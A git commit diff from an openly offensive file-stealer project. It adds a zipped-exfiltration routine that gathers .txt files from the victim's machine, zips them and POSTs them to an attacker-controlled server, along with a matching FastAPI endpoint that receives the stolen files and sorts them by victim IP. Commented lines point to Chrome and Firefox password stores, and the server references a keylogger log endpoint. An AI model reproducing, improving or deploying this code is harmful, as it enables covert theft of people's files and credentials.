671f9f0b68b64167c29440ba6fba414e8d2ea6c6
Nadav Nir <73201814+NN-7@users.noreply.github.com>
2025-10-03 19:05:40 +0300

    Added functionality to send the lot of files sent by file_stealer as one big zipped file to avoid a lot of loose files being sent at once which is slower. Saw a big improvement in performance.

--- file_stealer.py
+++ file_stealer.py
@@ -1,10 +1,14 @@
-import os
-import requests
-import threading
-import mimetypes
-from contextlib import ExitStack
+import os # dealing with files
+from zipfile import ZipFile
+import requests # to send files
+import threading # to run file sending mechanism in the background
+import mimetypes # to get MIME types for files
+from contextlib import ExitStack # to close files properly
+from secrets import token_hex
 
 URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the stolen files/information to
+ZIP_URL = 'http://127.0.0.1:8000/zip'
+INTERVAL = 3.0 # Interval between sending files (in seconds). Don't make this too low because you're going to DDOS yourself.
 USERNAME = os.getlogin()
 #GOOGLE_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Local\Google\Chrome\\User Data\Default' # location of Google passwords
 #FIREFOX_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords
@@ -21,12 +25,25 @@ def file_search():
         for file in files:
             #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
             if '.txt' in file: # check file type
-                #print(dir + '\\' + file) # for testing
+                #print(dir + '\\' + file) # for debugging
                 files_found.append([dir + '\\' + file]) # log the found file's address
             if len(files_found) > 100:
-                threading.Thread(target=steal_files()) # run the file stealing mechanism in the background
+                threading.Thread(target=steal_zipped_files()) # run the file stealing mechanism in the background
 
-def steal_files(): # steal files
+def steal_zipped_files():
+    count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
+    zip_name = make_zip() # make the zip with all its files and save its name
+    with open(zip_name, 'rb') as zip:
+        zip_file = {'file':(zip_name, zip, 'application/zip')}
+        r = requests.post(ZIP_URL, files=zip_file)
+        if not 300 > r.status_code >= 200:
+            pass
+        else:
+            zip.close()
+            os.remove(zip_name)
+            del files_found[:count]
+
+def steal_files(): # steal files (Non-zipped version, zipped version is default)
     count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
     files = {} # progressively add more files to the payload
     with ExitStack() as stack:
@@ -37,9 +54,17 @@ def steal_files(): # steal files
             type = mimetypes.guess_type(file) # get the MIME type
             files["files"] = (file_name, f, type) # make the payload for the file containing the file name, the file in binary, and its MIME type and add it to the list of the payload
         r = requests.post(URL, files=files) # POST (send) the file
-    if not r.ok:
+    if not 300 > r.status_code >= 200:
         pass
     else:
         del files_found[:count]
+
+def make_zip():
+    zip_name = f'{token_hex(64)}.zip' # give every zip a random name so you don't get errors due to a zip file being open when you're trying to delete it
+    print(f'Zipping {zip_name}')
+    with ZipFile(zip_name, 'w') as zip:
+        for file in files_found:
+            zip.write(file[0], arcname=os.path.basename(file[0]))
+    return zip_name
 
 file_search()
--- server.py
+++ server.py
@@ -1,14 +1,11 @@
 import uvicorn
 import os
+import mimetypes
+from zipfile import ZipFile
 from fastapi import FastAPI, Request, UploadFile, File
 from typing import List
 
 app = FastAPI()
-
-# @app.post('/')
-# async def test(request: Request):
-#     print((await request.body()).decode('utf-8'))
-
 
 @app.post("/")
 async def get_files(request: Request, files: List[UploadFile] = File(...)): # to recieve any amount of files of any type
@@ -29,6 +26,22 @@ async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # t
     contents = await file.read() # get file contents
     with open(f"{IP}/keylogger-log/{file.filename}", 'wb') as f: # write the file contents in bytes
         f.write(contents)
+
+@app.post("/zip")
+async def handle_zip(request: Request, file: UploadFile = File(...)):
+    IP = request.client.host  # get IP
+    os.makedirs(IP, exist_ok=True)  # make a directory for the IP that sent the file for organization
+    zip_name = f"{IP}/{file.filename}"
+    with open(zip_name, "wb") as zip:
+        zip.write(await file.read())
+    with ZipFile(zip_name, 'r') as zip:
+        files = zip.namelist()
+        for file in files:
+            file_type = mimetypes.guess_type(file)[0].replace('/', '-')
+            os.makedirs(f"{IP}/{file_type}", exist_ok=True)  # make a directory for the file type for organization
+            with open(f"{IP}/{file_type}/{file}", 'wb') as f:
+                f.write(zip.read(file))
+    os.remove(zip_name)
 
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=8000)
